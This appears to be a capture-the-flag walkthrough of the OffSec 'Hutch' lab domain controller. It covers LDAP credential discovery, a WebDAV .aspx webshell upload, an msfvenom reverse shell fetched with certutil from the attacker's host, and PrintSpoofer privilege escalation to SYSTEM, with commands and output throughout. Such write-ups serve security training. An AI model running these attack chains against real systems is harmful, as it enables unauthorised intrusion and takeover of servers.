
## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.155.122
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-24 08:01 -0500
Nmap scan report for 192.168.155.122
Host is up (0.023s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-webdav-scan: 
|   Server Date: Sat, 24 Jan 2026 13:03:09 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/10.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-24 13:02:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hutch.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: HUTCHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-24T13:03:14
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   22.63 ms 192.168.45.1
2   22.63 ms 192.168.45.254
3   22.68 ms 192.168.251.1
4   22.70 ms 192.168.155.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.85 seconds
```

Mapped the target ip to our discovered domain in our local dns file /etc/hosts.

```
sudo echo "192.168.155.122 hutch.offsec" |sudo tee -a /etc/hosts
```

Decided to enumerate LDAP using "ldapsearch".

```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.155.122" "(objectclass=*)"
ldap_initialize( ldap://192.168.155.122:389/??base )
# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at user's request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20210216133934.0Z
uSNCreated: 12831
uSNChanged: 49179
name: Freddy McSorley
objectGUID:: TxilGIhMVkuei6KplCd8ug==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132489437036308102
lastLogoff: 0
lastLogon: 132579563744834908
pwdLastSet: 132489417058152751
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: fmcsorley
sAMAccountType: 805306368
userPrincipalName: fmcsorley@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132579563744834908
msDS-SupportedEncryptionTypes: 0

# search result
search: 2
result: 0 Success

# numResponses: 42
# numEntries: 38
# numReferences: 3
```

Retrieved Credentials

```
fmcsorley:CrabSharkJellyfish192
```

Since we now got credentials, we could try and authenticate to webdav.
Ran davtest authenticated in order to check which file extensions could be uploaded & executed. It looks like we could upload and execute an .aspx webshell.

```
davtest -auth fmcsorley:CrabSharkJellyfish192 -url http://hutch.offsec        
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://hutch.offsec
********************************************************
NOTE    Random string for this session: pSVopB
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://hutch.offsec/DavTestDir_pSVopB
********************************************************
 Sending test files
PUT     shtml   SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.shtml
PUT     asp     SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.asp
PUT     php     SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.php
PUT     pl      SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.pl
PUT     html    SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.html
PUT     jhtml   SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.jhtml
PUT     jsp     SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.jsp
PUT     cfm     SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.cfm
PUT     txt     SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.txt
PUT     cgi     SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.cgi
PUT     aspx    SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.aspx
********************************************************
 Checking for test file execution
EXEC    shtml   FAIL
EXEC    asp     SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.asp
EXEC    asp     FAIL
EXEC    php     FAIL
EXEC    pl      FAIL
EXEC    html    SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.html
EXEC    html    FAIL
EXEC    jhtml   FAIL
EXEC    jsp     FAIL
EXEC    cfm     FAIL
EXEC    txt     SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.txt
EXEC    txt     FAIL
EXEC    cgi     FAIL
EXEC    aspx    SUCCEED:        http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.aspx
EXEC    aspx    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://hutch.offsec/DavTestDir_pSVopB
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.shtml
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.asp
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.php
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.pl
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.html
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.jhtml
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.jsp
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.cfm
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.txt
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.cgi
PUT File: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.aspx
Executes: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.asp
Executes: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.html
Executes: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.txt
Executes: http://hutch.offsec/DavTestDir_pSVopB/davtest_pSVopB.aspx

```

Utilized cadaver to connect to webdav.

```
cadaver http://hutch.offsec/      
Authentication required for hutch.offsec on server `hutch.offsec':
Username: fmcsorley
Password: 
dav:/> ls
Listing collection `/': succeeded.
Coll:   DavTestDir_pSVopB                      0  Jan 24 08:43
Coll:   aspnet_client                          0  Nov  4  2020
        iisstart.htm                         703  Nov  4  2020
        iisstart.png                       99710  Nov  4  2020
        index.aspx                          1241  Nov  4  2020
dav:/>
```

Uploaded .aspx webshell into webdav.

```
cadaver http://hutch.offsec/
Authentication required for hutch.offsec on server `hutch.offsec':
Username: fmcsorley
Password: 
dav:/> ls
Listing collection `/': succeeded.
Coll:   DavTestDir_pSVopB                      0  Jan 24 08:43
Coll:   aspnet_client                          0  Nov  4  2020
        cmd-asp-5.1.asp                     1181  Jan 24 08:50
        cmdasp.asp                          1526  Jan 24 08:48
        iisstart.htm                         703  Nov  4  2020
        iisstart.png                       99710  Nov  4  2020
        index.aspx                          1241  Nov  4  2020
dav:/> put *
Uploading * to `/*': Could not open file: No such file or directory
dav:/> put cmdasp.aspx
Uploading cmdasp.aspx to `/cmdasp.aspx':
Progress: [=============================>] 100.0% of 1400 bytes succeeded.
dav:/>
```

Upon inspecting http://hutch.offsec/cmdasp.aspx I gained command execution.
Enumerated systeminformation.

```
Host Name:                 HUTCHDC
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-70000-00000-AA530
Original Install Date:     11/4/2020, 4:06:43 AM
System Boot Time:          8/1/2024, 6:27:39 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 423 MB
Virtual Memory: Max Size:  3,199 MB
Virtual Memory: Available: 1,706 MB
Virtual Memory: In Use:    1,493 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    hutch.offsec
Logon Server:              N/A
Hotfix(s):                 7 Hotfix(s) Installed.
                           [01]: KB4580422
                           [02]: KB4462930
                           [03]: KB4512577
                           [04]: KB4577667
                           [05]: KB4580325
                           [06]: KB4587735
                           [07]: KB4592440
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.155.122
                                 [02]: fe80::a534:1ce7:edda:de6c
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Let's create an reverse shell utilizing msfvenom.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=88 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
```

Started webserver on local machine.
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

Downloaded our reverse shell .exe file onto target machine.

```
certutil -urlcache -split -f http://192.168.45.180/shell.exe C:\Windows\Temp\shell.exe
```

Started up listener on local machine.

```
nc -lvnp 88
```

Executed shell.exe on target machine.

```
C:\Windows\Temp\shell.exe
```

Gained RCE as user "iis apppool\defaultapppool".

```
nc -lvnp 88         
listening on [any] 88 ...
connect to [192.168.45.180] from (UNKNOWN) [192.168.155.122] 51902
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```

Retrieved local.txt in C:\Users\fmcsorley\Desktop.

```
3ad31f598951a26d9d31276610ceb88a
```

Enumerated privileges of current user. 

```
c:\Users\fmcsorley\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Identified that SeImpersonatePrivilege seems to be enabled. Let's try & abuse PrintSpoofer.exe.

Downloaded PrintSpoofer.exe onto target server.

```
c:\Temp>certutil -urlcache -split -f http://192.168.45.180/PrintSpoofer.exe PrintSpoofer.exe
certutil -urlcache -split -f http://192.168.45.180/PrintSpoofer.exe PrintSpoofer.exe
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.
```

Impersonated system process successfully and gained Domain Controller Access.

```
c:\Temp>PrintSpoofer.exe -i -c cmd.exe
PrintSpoofer.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
hutch\hutchdc$
```

Retrieved proof.txt in C:\Users\Administrator\Desktop.

```
435c11125d602a96fae95d9b8fbed79e
```
